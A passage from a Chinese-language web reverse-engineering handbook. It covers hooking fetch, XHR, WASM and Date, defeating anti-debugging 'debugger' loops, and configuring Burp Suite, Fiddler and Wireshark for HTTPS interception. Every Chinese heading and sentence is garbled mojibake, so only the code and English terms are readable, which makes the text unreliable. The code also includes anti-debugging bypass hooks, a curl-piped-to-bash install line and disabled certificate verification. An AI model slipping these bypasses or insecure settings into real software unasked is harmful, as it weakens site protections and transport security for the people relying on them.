<li>å›è°ƒåœ°ç‹±</li>
<li>æ‰§è¡Œé¡ºåºæ··ä¹±</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. Async Stack Traces</h4>
<pre><code class="language-javascript">// Chrome DevTools é»˜è®¤å¯ç”¨
// Settings â†’ Enable async stack traces

// ç°åœ¨å¯ä»¥çœ‹åˆ°å®Œæ•´çš„å¼‚æ­¥è°ƒç”¨æ ˆ
async function fetchData() {
  debugger; // å¯ä»¥çœ‹åˆ°å¼‚æ­¥è°ƒç”¨é“¾
  const data = await fetch(&quot;/api/data&quot;);
  return data.json();
}
</code></pre>
<h4>2. ä½¿ç”¨ console.trace</h4>
<pre><code class="language-javascript">async function complexAsync() {
  console.trace(&quot;Start&quot;); // æ˜¾ç¤ºè°ƒç”¨æ ˆ

  await step1();
  console.trace(&quot;After step1&quot;);

  await step2();
  console.trace(&quot;After step2&quot;);
}
</code></pre>
<h4>3. æ·»åŠ å¼‚æ­¥æ—¥å¿—</h4>
<pre><code class="language-javascript">// åŒ…è£… fetch
const originalFetch = window.fetch;
window.fetch = async function (...args) {
  console.log(&quot;Fetch started:&quot;, args[0]);
  try {
    const response = await originalFetch.apply(this, args);
    console.log(&quot;Fetch completed:&quot;, response.status);
    return response;
  } catch (error) {
    console.error(&quot;Fetch failed:&quot;, error);
    throw error;
  }
};
</code></pre>
<hr />
<h2>XHR/Fetch è¯·æ±‚æ‹¦æˆª</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>æ— æ³•æ•è· AJAX è¯·æ±‚</li>
<li>éœ€è¦æŸ¥çœ‹è¯·æ±‚å‚æ•°</li>
<li>éœ€è¦ä¿®æ”¹è¯·æ±‚</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. XHR æ–­ç‚¹</h4>
<pre><code class="language-javascript">// DevTools â†’ Sources â†’ XHR/fetch Breakpoints
// æ·»åŠ  URL åŒ…å«çš„å…³é”®å­—ï¼Œå¦‚ &quot;/api/&quot;
</code></pre>
<h4>2. Hook XMLHttpRequest</h4>
<pre><code class="language-javascript">(function () {
  const XHR = XMLHttpRequest.prototype;
  const open = XHR.open;
  const send = XHR.send;

  XHR.open = function (method, url) {
    this._method = method;
    this._url = url;
    return open.apply(this, arguments);
  };

  XHR.send = function (data) {
    console.log(&quot;XHR Request:&quot;, {
      method: this._method,
      url: this._url,
      data: data,
    });

    this.addEventListener(&quot;load&quot;, function () {
      console.log(&quot;XHR Response:&quot;, {
        status: this.status,
        response: this.responseText,
      });
    });

    return send.apply(this, arguments);
  };
})();
</code></pre>
<h4>3. Hook Fetch</h4>
<pre><code class="language-javascript">(function () {
  const originalFetch = window.fetch;

  window.fetch = async function (...args) {
    console.log(&quot;Fetch Request:&quot;, args);

    const response = await originalFetch.apply(this, args);

    // Clone å“åº”ä»¥é¿å…æ¶ˆè´¹
    const clonedResponse = response.clone();
    const text = await clonedResponse.text();

    console.log(&quot;Fetch Response:&quot;, {
      status: response.status,
      body: text,
    });

    return response;
  };
})();
</code></pre>
<hr />
<h2>WebAssembly è°ƒè¯•</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>WASM ä»£ç éš¾ä»¥ç†è§£</li>
<li>æ— æ³•è®¾ç½®æ–­ç‚¹</li>
<li>å˜é‡æŸ¥çœ‹å›°éš¾</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ WASM Debug Info</h4>
<pre><code class="language-javascript">// å¦‚æœ WASM åŒ…å«è°ƒè¯•ä¿¡æ¯
// Chrome DevTools å¯ä»¥æ˜¾ç¤ºæºç 

// æŸ¥çœ‹ WASM æ¨¡å—
WebAssembly.instantiate(bytes, imports).then((result) =&gt; {
  console.log(result.instance.exports);
});
</code></pre>
<h4>2. ä½¿ç”¨ wasmtime/wasmer è°ƒè¯•</h4>
<pre><code class="language-bash"># ä½¿ç”¨ wasmtime è¿è¡Œå¹¶è°ƒè¯•
wasmtime --invoke main module.wasm

# ä½¿ç”¨ wasmer
wasmer run module.wasm
</code></pre>
<h4>3. Hook WASM å‡½æ•°</h4>
<pre><code class="language-javascript">// è·å– WASM å®ä¾‹
const instance = wasmInstance;

// Hook å¯¼å‡ºå‡½æ•°
const originalFunc = instance.exports.encrypt;
instance.exports.encrypt = function (...args) {
  console.log(&quot;WASM encrypt called:&quot;, args);
  const result = originalFunc.apply(this, args);
  console.log(&quot;WASM encrypt result:&quot;, result);
  return result;
};
</code></pre>
<hr />
<h2>æ—¶é—´ç›¸å…³é—®é¢˜</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>æ—¶é—´æˆ³æ£€æµ‹</li>
<li>è¶…æ—¶å¤±æ•ˆ</li>
<li>å®šæ—¶å™¨é—®é¢˜</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. Hook Date</h4>
<pre><code class="language-javascript">// å›ºå®šæ—¶é—´
const fixedTime = new Date(&quot;2024-01-01 00:00:00&quot;).getTime();

const OriginalDate = Date;
window.Date = function (...args) {
  if (args.length === 0) {
    return new OriginalDate(fixedTime);
  }
  return new OriginalDate(...args);
};
Date.now = function () {
  return fixedTime;
};
Date.prototype = OriginalDate.prototype;
</code></pre>
<h4>2. Hook setTimeout/setInterval</h4>
<pre><code class="language-javascript">const originalSetTimeout = window.setTimeout;
window.setTimeout = function (callback, delay, ...args) {
  console.log(`setTimeout called: ${delay}ms`);
  return originalSetTimeout(callback, delay, ...args);
};
</code></pre>
<hr />
<h2>æ— é™ debugger</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code class="language-javascript">// åè°ƒè¯•ä»£ç 
setInterval(function () {
  debugger;
}, 100);
</code></pre>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ç¦ç”¨æ–­ç‚¹</h4>
<pre><code class="language-javascript">// Chrome DevTools:
// ç‚¹å‡» &quot;Deactivate breakpoints&quot; æŒ‰é’® (Ctrl + F8)
</code></pre>
<h4>2. æ¡ä»¶æ–­ç‚¹ç»•è¿‡</h4>
<pre><code class="language-javascript">// åœ¨ debugger è¯­å¥ä¸Šå³é”® â†’ &quot;Never pause here&quot;

// æˆ–æ·»åŠ æ¡ä»¶æ–­ç‚¹
false; // æ°¸è¿œä¸æš‚åœ
</code></pre>
<h4>3. æ›¿æ¢ debugger</h4>
<pre><code class="language-javascript">// ä½¿ç”¨ Overrides æˆ– Requestly
// å°†ä»£ç ä¸­çš„ debugger æ›¿æ¢ä¸ºç©ºè¯­å¥

// æˆ– Hook Function
const _constructor = Function.prototype.constructor;
Function.prototype.constructor = function (...args) {
  if (args.length &gt; 0 &amp;&amp; /debugger/.test(args[args.length - 1])) {
    return function () {};
  }
  return _constructor.apply(this, args);
};
</code></pre>
<hr />
<h2>è°ƒè¯•æŠ€å·§æ€»ç»“</h2>
<h3>1. å¿«æ·é”®</h3>
<table>
<thead>
<tr>
  <th>æ“ä½œ</th>
  <th>Windows/Linux</th>
  <th>Mac</th>
</tr>
</thead>
<tbody>
<tr>
  <td>æ‰“å¼€ DevTools</td>
  <td>F12</td>
  <td>Cmd + Opt + I</td>
</tr>
<tr>
  <td>æ‰“å¼€æ§åˆ¶å°</td>
  <td>Ctrl + Shift + J</td>
  <td>Cmd + Opt + J</td>
</tr>
<tr>
  <td>ä¸‹ä¸€æ­¥</td>
  <td>F10</td>
  <td>F10</td>
</tr>
<tr>
  <td>è¿›å…¥å‡½æ•°</td>
  <td>F11</td>
  <td>F11</td>
</tr>
<tr>
  <td>è·³å‡ºå‡½æ•°</td>
  <td>Shift + F11</td>
  <td>Shift + F11</td>
</tr>
<tr>
  <td>ç»§ç»­æ‰§è¡Œ</td>
  <td>F8</td>
  <td>F8</td>
</tr>
<tr>
  <td>ç¦ç”¨æ–­ç‚¹</td>
  <td>Ctrl + F8</td>
  <td>Cmd + F8</td>
</tr>
</tbody>
</table>
<h3>2. Console API</h3>
<pre><code class="language-javascript">// åˆ†ç»„æ—¥å¿—
console.group(&quot;Group 1&quot;);
console.log(&quot;message 1&quot;);
console.log(&quot;message 2&quot;);
console.groupEnd();

// è¡¨æ ¼æ˜¾ç¤º
console.table([
  { name: &quot;a&quot;, value: 1 },
  { name: &quot;b&quot;, value: 2 },
]);

// è®¡æ—¶
console.time(&quot;operation&quot;);
// ... æ“ä½œ
console.timeEnd(&quot;operation&quot;);

// è®¡æ•°
console.count(&quot;counter&quot;); // counter: 1
console.count(&quot;counter&quot;); // counter: 2

// æ–­è¨€
console.assert(1 === 2, &quot;Should not happen&quot;);
</code></pre>
<h3>3. Performance è°ƒè¯•</h3>
<pre><code class="language-javascript">// æ€§èƒ½æ ‡è®°
performance.mark(&quot;start&quot;);
// ... æ“ä½œ
performance.mark(&quot;end&quot;);
performance.measure(&quot;operation&quot;, &quot;start&quot;, &quot;end&quot;);

console.log(performance.getEntriesByType(&quot;measure&quot;));
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§</a></li>
<li><a href="#section-27">Hook æŠ€å·§</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-15">æµè§ˆå™¨ DevTools</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-78">
                                                <h2>[R77] Tool Issues</h2>
                                                <h1>R77: å·¥å…·ä½¿ç”¨é—®é¢˜</h1>
<p>å¸¸è§å¼€å‘å’Œé€†å‘å·¥å…·çš„é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>
<hr />
<h2>Chrome DevTools é—®é¢˜</h2>
<h3>æ— æ³•æ‰“å¼€ DevTools</h3>
<p><strong>é—®é¢˜</strong>: æŒ‰ F12 æˆ–å³é”®æ£€æŸ¥æ— ååº”</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-javascript">// 1. æ£€æŸ¥æ˜¯å¦è¢«ç¦ç”¨
// æŸäº›ç½‘ç«™ä¼šç¦ç”¨å³é”®èœå•å’Œå¿«æ·é”®

// ç»•è¿‡æ–¹æ³• 1: åœ¨åœ°å€æ è¾“å…¥
//inspect

// ç»•è¿‡æ–¹æ³• 2: ä»èœå•æ‰“å¼€
// Chrome â†’ æ›´å¤šå·¥å…· â†’ å¼€å‘è€…å·¥å…·

// ç»•è¿‡æ–¹æ³• 3: ä½¿ç”¨å¿«æ·é”®ç»„åˆ
chrome: Ctrl + Shift + I(Windows / Linux);
Cmd + Option + I(Mac);
</code></pre>
<h3>DevTools æ˜¾ç¤ºå¼‚å¸¸</h3>
<p><strong>é—®é¢˜</strong>: DevTools ç•Œé¢æ··ä¹±ã€å¡é¡¿æˆ–å´©æºƒ</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. é‡ç½® DevTools è®¾ç½®
# æ‰“å¼€ DevTools â†’ Settings (F1) â†’ Restore defaults

# 2. æ¸…é™¤ DevTools ç¼“å­˜
# Settings â†’ Preferences â†’ Network â†’ Disable cache (while DevTools is open)

# 3. ç¦ç”¨æ‰©å±•
# åœ¨éšèº«æ¨¡å¼æ‰“å¼€ (Ctrl + Shift + N)

# 4. å®Œå…¨é‡ç½® Chrome
# åˆ é™¤ç”¨æˆ·æ•°æ®ç›®å½•
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data
# Mac: ~/Library/Application Support/Google/Chrome
# Linux: ~/.config/google-chrome
</code></pre>
<h3>Network é¢æ¿æ— æ³•æŠ“åŒ…</h3>
<p><strong>é—®é¢˜</strong>: Network æ ‡ç­¾é¡µä¸­çœ‹ä¸åˆ°è¯·æ±‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<ol>
<li><strong>æ£€æŸ¥è¿‡æ»¤å™¨</strong></li>
</ol>
<pre><code class="language-javascript">// Network é¢æ¿ä¸­ï¼Œç¡®ä¿:
// - æœªå‹¾é€‰ &quot;Hide data URLs&quot;
// - Filter è¾“å…¥æ¡†ä¸ºç©º
// - All ç±»å‹å·²é€‰ä¸­
</code></pre>
<ol start="2">
<li><strong>å¯ç”¨æ—¥å¿—ä¿ç•™</strong></li>
</ol>
<pre><code class="language-javascript">// Network â†’ å‹¾é€‰ &quot;Preserve log&quot;
// è¿™æ ·é¡µé¢è·³è½¬åä»èƒ½çœ‹åˆ°ä¹‹å‰çš„è¯·æ±‚
</code></pre>
<ol start="3">
<li><strong>æ¸…é™¤ç¼“å­˜</strong></li>
</ol>
<pre><code class="language-javascript">// å³é”®åˆ·æ–°æŒ‰é’® â†’ &quot;Empty Cache and Hard Reload&quot;
</code></pre>
<hr />
<h2>Burp Suite é…ç½®é—®é¢˜</h2>
<h3>ä»£ç†é…ç½®ä¸ç”Ÿæ•ˆ</h3>
<p><strong>é—®é¢˜</strong>: è®¾ç½®ä»£ç†åæµè§ˆå™¨æ— æ³•è®¿é—®ç½‘ç«™</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<h4>1. æ£€æŸ¥ä»£ç†è®¾ç½®</h4>
<pre><code class="language-bash"># Burp Suite é»˜è®¤ä»£ç†
127.0.0.1:8080

# æµè§ˆå™¨ä»£ç†è®¾ç½® (Chrome)
chrome://settings/system
# æˆ–ä½¿ç”¨ SwitchyOmega æ‰©å±•
</code></pre>
<h4>2. æ£€æŸ¥ Burp ç›‘å¬å™¨</h4>
<pre><code>Proxy â†’ Options â†’ Proxy Listeners
ç¡®ä¿:
- Running: å‹¾é€‰
- Interface: 127.0.0.1:8080
- Support invisible proxying: å‹¾é€‰ (å¦‚éœ€è¦)
</code></pre>
<h4>3. é˜²ç«å¢™è®¾ç½®</h4>
<pre><code class="language-bash"># Windows é˜²ç«å¢™å¯èƒ½é˜»æ­¢æœ¬åœ°ç«¯å£
# æ·»åŠ å…¥ç«™è§„åˆ™å…è®¸ 8080 ç«¯å£

# Linux
sudo ufw allow 8080
</code></pre>
<h3>SSL è¯ä¹¦é—®é¢˜</h3>
<p><strong>é—®é¢˜</strong>: HTTPS ç½‘ç«™æ˜¾ç¤ºè¯ä¹¦é”™è¯¯</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<h4>1. å¯¼å…¥ Burp CA è¯ä¹¦</h4>
<pre><code class="language-bash"># 1. å¯¼å‡ºè¯ä¹¦
# Proxy â†’ Options â†’ Import/Export CA certificate
# å¯¼å‡ºä¸º DER æ ¼å¼

# 2. å®‰è£…åˆ°ç³»ç»Ÿ
# Windows: åŒå‡» .cer æ–‡ä»¶ â†’ å®‰è£…åˆ°&quot;å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„&quot;
# Mac: åŒå‡» â†’ æ·»åŠ åˆ°é’¥åŒ™ä¸² â†’ è®¾ç½®ä¸º&quot;å§‹ç»ˆä¿¡ä»»&quot;
# Linux: sudo cp cacert.der /usr/local/share/ca-certificates/burp.crt
#        sudo update-ca-certificates
</code></pre>
<h4>2. Firefox ç‰¹æ®Šé…ç½®</h4>
<pre><code>Firefox ä½¿ç”¨ç‹¬ç«‹è¯ä¹¦å­˜å‚¨

1. æ‰“å¼€ Firefox â†’ Settings â†’ Privacy &amp; Security
2. Certificates â†’ View Certificates â†’ Import
3. å¯¼å…¥ Burp CA è¯ä¹¦
4. å‹¾é€‰ &quot;Trust this CA to identify websites&quot;
</code></pre>
<h3>Burp æ‹¦æˆªå¤ªå¤šè¯·æ±‚</h3>
<p><strong>é—®é¢˜</strong>: Proxy intercept æ‹¦æˆªäº†è¿‡å¤šæ— å…³è¯·æ±‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code># é…ç½®æ‹¦æˆªè§„åˆ™
Proxy â†’ Options â†’ Intercept Client Requests

# æ·»åŠ è§„åˆ™,åªæ‹¦æˆªç›®æ ‡åŸŸå
And URL Is in target scope

# æˆ–æ·»åŠ ç™½åå•
And URL matches: ^https://target\.com/.*
</code></pre>
<hr />
<h2>Fiddler é—®é¢˜</h2>
<h3>æ— æ³•æ•è· HTTPS æµé‡</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code>1. Tools â†’ Options â†’ HTTPS
2. å‹¾é€‰ &quot;Capture HTTPS CONNECTs&quot;
3. å‹¾é€‰ &quot;Decrypt HTTPS traffic&quot;
4. ç‚¹å‡» &quot;Actions&quot; â†’ &quot;Trust Root Certificate&quot;
5. é‡å¯ Fiddler
</code></pre>
<h3>ä»£ç†å†²çª</h3>
<p><strong>é—®é¢˜</strong>: ä¸å…¶ä»–ä»£ç†å·¥å…·å†²çª</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. æ£€æŸ¥ç³»ç»Ÿä»£ç†
netsh winhttp show proxy  # Windows

# 2. é‡ç½®ç³»ç»Ÿä»£ç†
netsh winhttp reset proxy

# 3. å…³é—­å…¶ä»–ä»£ç†å·¥å…·
# å¦‚ Charles, Burp, Proxifier ç­‰
</code></pre>
<hr />
<h2>Python ç¯å¢ƒé—®é¢˜</h2>
<h3>ModuleNotFoundError</h3>
<p><strong>é—®é¢˜</strong>: <code>ModuleNotFoundError: No module named 'xxx'</code></p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. æ£€æŸ¥æ˜¯å¦å®‰è£…
pip list | grep xxx

# 2. å®‰è£…æ¨¡å—
pip install xxx

# 3. æ£€æŸ¥ Python ç‰ˆæœ¬
python --version
pip --version

# 4. å¦‚æœæœ‰å¤šä¸ª Python ç‰ˆæœ¬
python3 -m pip install xxx

# 5. ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ
python -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate     # Windows
pip install -r requirements.txt
</code></pre>
<h3>SSL è¯ä¹¦éªŒè¯å¤±è´¥</h3>
<p><strong>é—®é¢˜</strong>: <code>SSLError: [SSL: CERTIFICATE_VERIFY_FAILED]</code></p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python"># æ–¹æ³• 1: å‡çº§ certifi
pip install --upgrade certifi

# æ–¹æ³• 2: åœ¨ä»£ç ä¸­ç¦ç”¨éªŒè¯ (ä¸æ¨èç”¨äºç”Ÿäº§ç¯å¢ƒ)
import requests
requests.get(url, verify=False)

# æ–¹æ³• 3: æŒ‡å®šè¯ä¹¦è·¯å¾„
import certifi
requests.get(url, verify=certifi.where())

# æ–¹æ³• 4: è®¾ç½®ç¯å¢ƒå˜é‡
import os
os.environ['REQUESTS_CA_BUNDLE'] = '/path/to/ca-bundle.crt'
</code></pre>
<h3>ç¼–ç é—®é¢˜</h3>
<p><strong>é—®é¢˜</strong>: <code>UnicodeDecodeError</code> æˆ– <code>UnicodeEncodeError</code></p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python"># è¯»å–æ–‡ä»¶æ—¶æŒ‡å®šç¼–ç 
with open('file.txt', 'r', encoding='utf-8') as f:
    content = f.read()

# å†™å…¥æ–‡ä»¶æ—¶æŒ‡å®šç¼–ç 
with open('file.txt', 'w', encoding='utf-8') as f:
    f.write(content)

# å¤„ç†ç½‘ç»œå“åº”
response.encoding = 'utf-8'
text = response.text

# æˆ–ä½¿ç”¨ chardet è‡ªåŠ¨æ£€æµ‹
import chardet
encoding = chardet.detect(response.content)['encoding']
text = response.content.decode(encoding)
</code></pre>
<hr />
<h2>Node.js é—®é¢˜</h2>
<h3>npm å®‰è£…å¤±è´¥</h3>
<p><strong>é—®é¢˜</strong>: <code>npm ERR! code EACCES</code> æˆ–ä¸‹è½½è¶…æ—¶</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. æƒé™é—®é¢˜ (Linux/Mac)
sudo chown -R $USER ~/.npm
sudo chown -R $USER /usr/local/lib/node_modules

# 2. ä½¿ç”¨æ·˜å®é•œåƒ
npm config set registry https://registry.npmmirror.com

# 3. æ¸…é™¤ç¼“å­˜
npm cache clean --force

# 4. åˆ é™¤ node_modules é‡æ–°å®‰è£…
rm -rf node_modules package-lock.json
npm install

# 5. ä½¿ç”¨ cnpm
npm install -g cnpm --registry=https://registry.npmmirror.com
cnpm install
</code></pre>
<h3>Node ç‰ˆæœ¬é—®é¢˜</h3>
<p><strong>é—®é¢˜</strong>: é¡¹ç›®éœ€è¦ç‰¹å®š Node ç‰ˆæœ¬</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># ä½¿ç”¨ nvm ç®¡ç†å¤šç‰ˆæœ¬
# å®‰è£… nvm
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash

# å®‰è£…ç‰¹å®šç‰ˆæœ¬
nvm install 18.17.0
nvm use 18.17.0

# è®¾ç½®é»˜è®¤ç‰ˆæœ¬
nvm alias default 18.17.0

# æˆ–ä½¿ç”¨ n
npm install -g n
n 18.17.0
</code></pre>
<hr />
<h2>Postman é—®é¢˜</h2>
<h3>è„šæœ¬æ‰§è¡Œé”™è¯¯</h3>
<p><strong>é—®é¢˜</strong>: Pre-request Script æˆ– Tests è„šæœ¬æŠ¥é”™</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-javascript">// 1. æ£€æŸ¥è¯­æ³•
// Postman ä½¿ç”¨å—é™çš„ JavaScript ç¯å¢ƒ

// 2. å¸¸ç”¨åŠŸèƒ½ç¤ºä¾‹

// è®¾ç½®ç¯å¢ƒå˜é‡
pm.environment.set(&quot;token&quot;, jsonData.token);

// å‘é€è¯·æ±‚
pm.sendRequest(&quot;https://api.example.com/data&quot;, (err, res) =&gt; {
  if (err) {
    console.log(err);
  } else {
    console.log(res.json());
  }
});

// ä½¿ç”¨ CryptoJS
const encrypted = CryptoJS.MD5(&quot;message&quot;).toString();

// ä½¿ç”¨ moment.js
const now = moment().format();
</code></pre>
<h3>è¯·æ±‚å¤±è´¥</h3>
<p><strong>é—®é¢˜</strong>: è¯·æ±‚è¿”å›é”™è¯¯</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-javascript">// 1. æ£€æŸ¥ä»£ç†è®¾ç½®
Settings â†’ Proxy â†’ å…³é—­ &quot;Use the system proxy&quot;

// 2. ç¦ç”¨ SSL éªŒè¯ (ä»…æµ‹è¯•ç¯å¢ƒ)
Settings â†’ General â†’ å…³é—­ &quot;SSL certificate verification&quot;

// 3. æ·»åŠ è¯¦ç»†æ—¥å¿—
console.log(&quot;Request:&quot;, pm.request);
console.log(&quot;Response:&quot;, pm.response);
</code></pre>
<hr />
<h2>VS Code é—®é¢˜</h2>
<h3>Python IntelliSense ä¸å·¥ä½œ</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-json">// settings.json
{
  &quot;python.defaultInterpreterPath&quot;: &quot;/path/to/python&quot;,
  &quot;python.analysis.typeCheckingMode&quot;: &quot;basic&quot;,
  &quot;python.analysis.autoImportCompletions&quot;: true
}
</code></pre>
<h3>è°ƒè¯•é…ç½®</h3>
<p><strong>launch.json ç¤ºä¾‹</strong>:</p>
<pre><code class="language-json">{
  &quot;version&quot;: &quot;0.2.0&quot;,
  &quot;configurations&quot;: [
    {
      &quot;name&quot;: &quot;Python: Current File&quot;,
      &quot;type&quot;: &quot;python&quot;,
      &quot;request&quot;: &quot;launch&quot;,
      &quot;program&quot;: &quot;${file}&quot;,
      &quot;console&quot;: &quot;integratedTerminal&quot;,
      &quot;env&quot;: {
        &quot;PYTHONPATH&quot;: &quot;${workspaceFolder}&quot;
      }
    },
    {
      &quot;name&quot;: &quot;Node: Current File&quot;,
      &quot;type&quot;: &quot;node&quot;,
      &quot;request&quot;: &quot;launch&quot;,
      &quot;program&quot;: &quot;${file}&quot;,
      &quot;skipFiles&quot;: [&quot;&lt;node_internals&gt;/**&quot;]
    }
  ]
}
</code></pre>
<hr />
<h2>Git é—®é¢˜</h2>
<h3>æ¨é€å¤±è´¥</h3>
<p><strong>é—®é¢˜</strong>: <code>! [rejected] ... (fetch first)</code></p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. å…ˆæ‹‰å–è¿œç¨‹æ›´æ”¹
git pull origin main

# 2. å¦‚æœæœ‰å†²çªï¼Œè§£å†³åæäº¤
git add .
git commit -m &quot;Merge conflicts&quot;

# 3. æ¨é€
git push origin main

# å¼ºåˆ¶æ¨é€ (è°¨æ…ä½¿ç”¨)
git push -f origin main
</code></pre>
<h3>å¤§æ–‡ä»¶é—®é¢˜</h3>
<p><strong>é—®é¢˜</strong>: æ–‡ä»¶è¿‡å¤§æ— æ³•æäº¤</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. ä½¿ç”¨ Git LFS
git lfs install
git lfs track &quot;*.psd&quot;
git add .gitattributes

# 2. ä»å†å²ä¸­ç§»é™¤å¤§æ–‡ä»¶
git filter-branch --tree-filter 'rm -f large_file.zip' HEAD

# 3. ä½¿ç”¨ .gitignore
echo &quot;*.log&quot; &gt;&gt; .gitignore
echo &quot;data/&quot; &gt;&gt; .gitignore
</code></pre>
<hr />
<h2>Wireshark é—®é¢˜</h2>
<h3>æ— æ³•æ•è· HTTPS å†…å®¹</h3>
<p><strong>é—®é¢˜</strong>: æŠ“åŒ…åªèƒ½çœ‹åˆ°åŠ å¯†æµé‡</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-bash"># 1. é…ç½® SSL/TLS å¯†é’¥æ—¥å¿—æ–‡ä»¶

# è®¾ç½®ç¯å¢ƒå˜é‡ (Chrome/Firefox)
export SSLKEYLOGFILE=~/sslkeys.log  # Linux/Mac
set SSLKEYLOGFILE=C:\sslkeys.log    # Windows

# 2. åœ¨ Wireshark ä¸­é…ç½®
# Edit â†’ Preferences â†’ Protocols â†’ TLS
# (Pre)-Master-Secret log filename: é€‰æ‹©ä¸Šé¢çš„æ–‡ä»¶

# 3. é‡å¯æµè§ˆå™¨åæŠ“åŒ…,å°±èƒ½çœ‹åˆ°è§£å¯†å†…å®¹
</code></pre>
<h3>è¿‡æ»¤è§„åˆ™</h3>
<p><strong>å¸¸ç”¨è¿‡æ»¤å™¨</strong>:</p>
<pre><code># HTTP è¯·æ±‚
http.request

# ç‰¹å®šåŸŸå
http.host contains &quot;example.com&quot;

# ç‰¹å®š IP
ip.addr == 192.168.1.1

# ç«¯å£
tcp.port == 443

# åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²
frame contains &quot;password&quot;
</code></pre>
<hr />
<h2>æŠ“åŒ…å·¥å…·é…ç½®</h2>
<h3>ç³»ç»Ÿä»£ç†è®¾ç½®</h3>
<h4>Windows</h4>
<pre><code class="language-bash"># è®¾ç½®ä»£ç†
netsh winhttp set proxy 127.0.0.1:8080

# æŸ¥çœ‹ä»£ç†
netsh winhttp show proxy

# å–æ¶ˆä»£ç†
netsh winhttp reset proxy
</code></pre>
<h4>macOS</h4>
<pre><code class="language-bash"># é€šè¿‡ networksetup
sudo networksetup -setwebproxy &quot;Wi-Fi&quot; 127.0.0.1 8080
sudo networksetup -setsecurewebproxy &quot;Wi-Fi&quot; 127.0.0.1 8080

# å…³é—­ä»£ç†
sudo networksetup -setwebproxystate &quot;Wi-Fi&quot; off
sudo networksetup -setsecurewebproxystate &quot;Wi-Fi&quot; off
</code></pre>
<h4>Linux</h4>
<pre><code class="language-bash"># è®¾ç½®ç¯å¢ƒå˜é‡
export http_proxy=&quot;http://127.0.0.1:8080&quot;
export https_proxy=&quot;http://127.0.0.1:8080&quot;

# æ°¸ä¹…è®¾ç½® (æ·»åŠ åˆ° ~/.bashrc)
echo 'export http_proxy=&quot;http://127.0.0.1:8080&quot;' &gt;&gt; ~/.bashrc
echo 'export https_proxy=&quot;http://127.0.0.1:8080&quot;' &gt;&gt; ~/.bashrc
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-16">Burp Suite æŒ‡å—</a></li>
<li><a href="#section-15">Chrome DevTools</a></li>
<li><a href="#section-23">Node.js è°ƒè¯•</a></li>
<li><a href="#section-63">å¸¸ç”¨å‘½ä»¤</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-79">
                                                <h2>[R78] Data Issues</h2>
                                                <h1>R78: æ•°æ®å¤„ç†é—®é¢˜</h1>
<p>æ•°æ®é‡‡é›†ã€è§£æå’Œå­˜å‚¨ä¸­çš„å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>
<hr />
<h2>ç¼–ç é”™è¯¯</h2>
<h3>UnicodeDecodeError</h3>
<p><strong>é—®é¢˜è¡¨ç°</strong>:</p>
<pre><code class="language-python">UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0
</code></pre>
<p><strong>åŸå› </strong>: æ–‡ä»¶æˆ–æ•°æ®ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç æ ¼å¼</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<h4>1. è‡ªåŠ¨æ£€æµ‹ç¼–ç </h4>
<pre><code class="language-python">import chardet

# æ£€æµ‹æ–‡ä»¶ç¼–ç 
with open('file.txt', 'rb') as f:
    raw_data = f.read()
    result = chardet.detect(raw_data)
    encoding = result['encoding']
    confidence = result['confidence']

print(f&quot;Encoding: {encoding} (Confidence: {confidence})&quot;)

